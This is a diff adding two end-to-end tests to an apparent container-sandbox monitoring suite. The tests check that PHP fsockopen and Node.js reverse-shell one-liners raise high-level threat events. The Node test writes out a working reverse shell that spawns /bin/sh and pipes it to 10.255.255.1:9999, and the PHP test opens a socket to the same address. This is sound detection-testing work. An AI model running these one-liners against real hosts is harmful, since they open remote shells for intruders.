@@ -5066,6 +5066,220 @@ process_spawn_rate_threshold = 9999
             cleanup_container(container_name, coi_binary)
 
 
+    def test_php_fsockopen_exec_detected(self, test_workspace, coi_binary):
+        """Executing a PHP fsockopen reverse-shell one-liner triggers a HIGH proc_event threat.
+
+        php-fsockopen pattern fires when php is argv[0] and 'fsockopen' appears in the cmdline.
+        php-cli is installed inside the container before the test runs.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = false
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 9999
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-68"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "68",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            # Install php-cli inside the container.
+            subprocess.run(
+                ["incus", "exec", container_name, "--", "apt-get", "install", "-y", "-q", "php-cli"],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=60,
+            )
+
+            # Allow monitoring daemon and PROC_EVENTS subscription to initialise.
+            time.sleep(3)
+
+            # Run a PHP one-liner whose cmdline contains "php" (argv[0]) and
+            # "fsockopen", matching the php-fsockopen exec pattern. The connection
+            # attempt will fail immediately — PROC_EVENT_EXEC fires at execve time.
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "php",
+                    "-r",
+                    "$sock=fsockopen('10.255.255.1',9999); if($sock){fclose($sock);}",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            ).wait(timeout=10)
+
+            # Poll until the proc_event threat appears (30 s timeout).
+            proc_events = []
+            events = []
+            for _ in range(30):
+                events = get_threat_events(container_name)
+                proc_events = [
+                    e
+                    for e in events
+                    if e.get("category") == "proc_event"
+                    and e.get("evidence", {}).get("proc_event", {}).get("pattern")
+                    == "php-fsockopen"
+                ]
+                if proc_events:
+                    break
+                time.sleep(1)
+
+            assert len(proc_events) > 0, (
+                f"Expected proc_event threat for php fsockopen one-liner, got events: {events}"
+            )
+            assert proc_events[0].get("level") == "high", (
+                f"Expected high level, got: {proc_events[0].get('level')}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+    def test_node_reverse_shell_exec_detected(self, test_workspace, coi_binary):
+        """Executing a Node.js reverse-shell one-liner triggers a HIGH proc_event threat.
+
+        node-reverse-shell pattern fires when node is argv[0] and both 'child_process'
+        and 'net' appear in the cmdline.
+        """
+        config_path = Path.home() / ".coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = false
+auto_kill_on_critical = true
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+process_count_threshold = 9999
+process_spawn_rate_threshold = 9999
+"""
+        )
+
+        container_name = (
+            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-69"
+        )
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "69",
+                "--debug",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        try:
+            assert wait_for_container_running(container_name), (
+                f"Container {container_name} did not start"
+            )
+
+            # Install nodejs inside the container if not present.
+            subprocess.run(
+                ["incus", "exec", container_name, "--", "apt-get", "install", "-y", "-q", "nodejs"],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=60,
+            )
+
+            # Allow monitoring daemon and PROC_EVENTS subscription to initialise.
+            time.sleep(3)
+
+            # Run a Node.js one-liner whose cmdline contains "node" (argv[0]),
+            # "child_process", and "net" — the canonical node reverse-shell signature.
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "node",
+                    "-e",
+                    "var sh=require('child_process').spawn('/bin/sh');require('net').connect(9999,'10.255.255.1',function(){this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            ).wait(timeout=10)
+
+            # Poll until the proc_event threat appears (30 s timeout).
+            proc_events = []
+            events = []
+            for _ in range(30):
+                events = get_threat_events(container_name)
+                proc_events = [
+                    e
+                    for e in events
+                    if e.get("category") == "proc_event"
+                    and e.get("evidence", {}).get("proc_event", {}).get("pattern")
+                    == "node-reverse-shell"
+                ]
+                if proc_events:
+                    break
+                time.sleep(1)
+
+            assert len(proc_events) > 0, (
+                f"Expected proc_event threat for node reverse-shell one-liner, got events: {events}"
+            )
+            assert proc_events[0].get("level") == "high", (
+                f"Expected high level, got: {proc_events[0].get('level')}"
+            )
+        finally:
+            proc.terminate()
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+            cleanup_container(container_name, coi_binary)
+
+
 # These end-to-end tests verify all monitoring aspects:
 # - Threat detection (reverse shells, env scanning, large file reads, network connections)
 # - Reverse shell patterns (netcat, bash, python, perl, php)
